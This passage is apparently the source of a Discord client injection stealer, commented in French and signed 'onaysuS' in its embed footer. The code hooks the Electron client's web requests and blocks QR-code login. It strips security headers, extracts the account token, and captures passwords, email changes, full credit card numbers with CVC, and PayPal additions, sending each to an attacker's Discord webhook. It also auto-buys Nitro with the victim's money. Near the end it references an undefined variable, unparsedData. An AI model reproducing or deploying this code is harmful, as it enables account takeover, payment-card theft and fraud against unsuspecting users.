    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Changement d\'Adresse E-mail**',
            value: `Nouvelle Adresse E-mail: **${email}**\nMot de Passe: **${password}**`,
            inline: true,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro: **${nitro}**\nBadges: **${badges}**\nFacturation: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};

// Fonction pour signaler l'ajout de PayPal et envoyer un message à un webhook Discord
const PaypalAdded = async (token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Paypal Ajouté**',
            value: `Il est temps d'acheter du Nitro ! 😩`,
            inline: false,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro: **${nitro}**\nBadges: **${badges}**\nFacturation: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};

// Fonction pour signaler l'ajout d'une carte de crédit et envoyer un message à un webhook Discord
const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Carte de Crédit Ajoutée**',
            value: `Numéro de Carte de Crédit: **${number}**\nCVC: **${cvc}**\nExpiration de la Carte de Crédit: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro: **${nitro}**\nBadges: **${badges}**\nFacturation: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};

// Fonction pour signaler l'achat de Nitro et envoyer un message à un webhook Discord
const nitroBought = async (token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Acheter Nitro et obtenir un code Nitro (si réussi)
  const code = await buyNitro(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Nitro acheté !**',
            value: `**Code Nitro :**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro : **${nitro}**\nBadges : **${badges}**\nFacturation : **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};
// Intercepte les requêtes avant leur envoi
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  // Vérifie si l'URL de la requête commence par 'wss://remote-auth-gateway'
  if (details.url.startsWith('wss://remote-auth-gateway')) {
    // Annule la requête en renvoyant { cancel: true }
    return callback({ cancel: true });
  }
  updateCheck();
});


// Intercepte les en-têtes de réponse des requêtes
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  // Vérifie si l'URL de la requête commence par config.webhook
  if (details.url.startsWith(config.webhook)) {
    // Si l'URL inclut 'discord.com', autorise l'accès en ajoutant les en-têtes CORS
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      // Si l'URL n'inclut pas 'discord.com', configure les en-têtes CORS et la politique de sécurité du contenu
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    // Supprime les en-têtes de politique de sécurité du contenu ('content-security-policy') de la réponse
    // et autorise l'accès en ajoutant les en-têtes CORS
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

// Intercepte les requêtes terminées avec succès ayant un code de statut 200 ou 202
session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;

  // Récupère les données de la requête en les décodant
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);

  // Obtient le jeton d'accès en utilisant une expression JavaScript exécutée dans la fenêtre actuelle
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );

  // Effectue différentes actions en fonction de l'URL de la requête
  switch (true) {
    case details.url.endsWith('login'):
      // Si l'URL se termine par 'login', appelle la fonction 'login'
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      // Si l'URL se termine par 'users/@me' et que la méthode est 'PATCH', vérifie les modifications du compte
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      // Si l'URL se termine par 'tokens' et que la méthode est 'POST', vérifie l'ajout d'une carte de crédit
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      // Si l'URL se termine par 'paypal_accounts' et que la méthode est 'POST', vérifie l'ajout de compte PayPal
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      // Si l'URL se termine par 'confirm' et que la méthode est 'POST', vérifie la confirmation de l'achat Nitro
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});

// Exporte le module 'core.asar'
module.exports = require('./core.asar');